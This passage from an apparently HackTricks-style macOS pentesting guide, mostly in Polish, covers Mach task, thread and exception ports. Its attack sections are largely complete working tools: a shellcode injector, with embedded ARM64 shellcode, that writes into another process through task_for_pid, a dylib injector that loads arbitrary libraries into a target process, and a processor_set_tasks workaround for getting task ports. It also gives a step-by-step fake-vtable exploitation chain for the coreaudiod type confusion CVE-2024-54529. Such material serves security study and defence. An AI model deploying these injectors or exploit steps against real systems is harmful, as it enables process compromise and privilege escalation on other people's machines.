Ponadto task_port jest również portem **`vm_map`**, który umożliwia **odczytywanie i modyfikowanie pamięci** wewnątrz task za pomocą funkcji takich jak `vm_read()` i `vm_write()`. Oznacza to zasadniczo, że task posiadający prawa SEND do task_port innego task będzie mógł **wstrzyknąć kod do tego task**.

Pamiętaj, że ponieważ **kernel również jest task**, jeśli komuś uda się uzyskać **uprawnienia SEND** do **`kernel_task`**, będzie mógł sprawić, aby kernel wykonał dowolny kod (jailbreaki).

- Wywołaj `mach_task_self()`, aby **uzyskać nazwę** tego portu dla task wywołującego. Port ten jest tylko **dziedziczony** przez **`exec()`**; nowy task utworzony za pomocą `fork()` otrzymuje nowy task port (jako szczególny przypadek task otrzymuje również nowy task port po `exec()`w pliku binarnym suid). Jedynym sposobem na utworzenie task i uzyskanie jego portu jest wykonanie ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) podczas wykonywania `fork()`.
- Oto ograniczenia dostępu do portu (z `macos_task_policy` w pliku binarnym `AppleMobileFileIntegrity`):
- Jeśli aplikacja ma **entitlement `com.apple.security.get-task-allow`**, procesy tego **samego użytkownika mogą uzyskać dostęp do task port** (jest on często dodawany przez Xcode na potrzeby debugowania). Proces **notarization** nie zezwoli na to w wydaniach produkcyjnych.
- Aplikacje z **entitlement `com.apple.system-task-ports`** mogą uzyskać **task port dowolnego** procesu, z wyjątkiem kernela. We wcześniejszych wersjach nazywał się on **`task_for_pid-allow`**. Jest przyznawany wyłącznie aplikacjom Apple.
- **Root może uzyskać dostęp do task ports** aplikacji, które nie zostały skompilowane z **hardened** runtime i nie pochodzą od Apple.

**Task name port:** Nieuprzywilejowana wersja _task port_. Odwołuje się do task, ale nie pozwala nim sterować. Jedyną funkcją, która wydaje się dostępna za jego pośrednictwem, jest `task_info()`.

### Thread Ports

Wątki również mają powiązane porty, które są widoczne dla task wywołującego **`task_threads`** oraz dla procesora za pomocą `processor_set_threads`. Prawo SEND do thread port pozwala używać funkcji z subsystemu `thread_act`, takich jak:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Dowolny wątek może uzyskać ten port, wywołując **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Możesz pobrać shellcode z:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Skompiluj** poprzedni program i dodaj **entitlements**, aby móc wstrzykiwać code jako ten sam user (w przeciwnym razie konieczne będzie użycie **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Aby to zadziałało na iOS, potrzebujesz entitlement `dynamic-codesigning`, aby móc wykonywać kod z pamięci z możliwością zapisu.

### Dylib Injection in thread via Task port

W macOS **threads** mogą być modyfikowane za pomocą **Mach** lub przy użyciu **posix `pthread` api**. Wątek utworzony podczas poprzedniej injection został utworzony za pomocą Mach api, więc **nie jest zgodny z posix**.

Możliwe było **wstrzyknięcie prostego shellcode** w celu wykonania polecenia, ponieważ **nie musiał on współpracować ze zgodnymi z posix** api, a jedynie z Mach. **Bardziej złożone injections** wymagałyby, aby **thread** był również **zgodny z posix**.

Dlatego, aby **ulepszyć thread**, powinien on wywołać **`pthread_create_from_mach_thread`**, które **utworzy prawidłowy pthread**. Następnie ten nowy pthread może **wywołać dlopen**, aby **załadować dylib** z systemu, dzięki czemu zamiast zapisywania nowego shellcode do wykonywania różnych działań można załadować niestandardowe biblioteki.<sup>[[2]](#references)</sup>

Możesz znaleźć **przykładowe dylib** w (na przykład tę, która generuje log, którego można następnie nasłuchiwać):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

W tej technice wątek procesu zostaje przejęty:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Wykrywanie Task Port Injection

Wywołanie `task_for_pid` lub `thread_create_*` zwiększa licznik w strukturze task w jądrze, do którego można uzyskać dostęp z trybu użytkownika, wywołując task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Gdy w wątku wystąpi wyjątek, zostaje on wysłany do wyznaczonego exception port tego wątku. Jeśli wątek go nie obsłuży, zostaje on wysłany do exception ports task. Jeśli task go nie obsłuży, zostaje on wysłany do host port zarządzanego przez launchd, gdzie zostanie potwierdzony. Nazywa się to exception triage.

Należy zauważyć, że ostatecznie, jeśli zgłoszenie nie zostanie prawidłowo obsłużone, zwykle trafi ono do daemona ReportCrash. Możliwe jest jednak, aby inny wątek w ramach tego samego task obsłużył wyjątek; właśnie tak działają narzędzia do raportowania awarii, takie jak `PLCreashReporter`.

## Inne obiekty

### Zegar

Każdy użytkownik może uzyskać dostęp do informacji o zegarze, jednak aby ustawić czas lub zmodyfikować inne ustawienia, trzeba być rootem.

Aby uzyskać informacje, można wywołać funkcje z podsystemu `clock`, takie jak: `clock_get_time`, `clock_get_attributtes` lub `clock_alarm`\
Aby zmodyfikować wartości, można użyć podsystemu `clock_priv` wraz z funkcjami takimi jak `clock_set_time` i `clock_set_attributes`

### Procesory i zestaw procesorów

API procesora pozwala kontrolować pojedynczy procesor logiczny za pomocą funkcji takich jak `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Ponadto API **processor set** umożliwia grupowanie wielu procesorów w jedną grupę. Możliwe jest pobranie domyślnego zestawu procesorów przez wywołanie **`processor_set_default`**.\
Oto kilka interesujących API służących do interakcji z zestawem procesorów:

- `processor_set_statistics`
- `processor_set_tasks`: Zwraca tablicę send rights do wszystkich tasków w zestawie procesorów
- `processor_set_threads`: Zwraca tablicę send rights do wszystkich wątków w zestawie procesorów
- `processor_set_stack_usage`
- `processor_set_info`

Jak wspomniano w [**tym poście**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), w przeszłości umożliwiało to obejście wcześniej wspomnianej ochrony w celu uzyskania task ports innych procesów i kontrolowania ich poprzez wywołanie **`processor_set_tasks`** oraz uzyskanie host port dla każdego procesu.\
Obecnie do użycia tej funkcji potrzebny jest root, a funkcja jest chroniona, więc będzie można uzyskać te porty wyłącznie dla niezabezpieczonych procesów.<sup>[[11]](#references)</sup>

Możesz wypróbować to za pomocą:

<details>

<summary><strong>kod processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[10]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; pośrednie wywołanie przez slot vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)
- [7] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [8] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [9] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [10] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [11] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
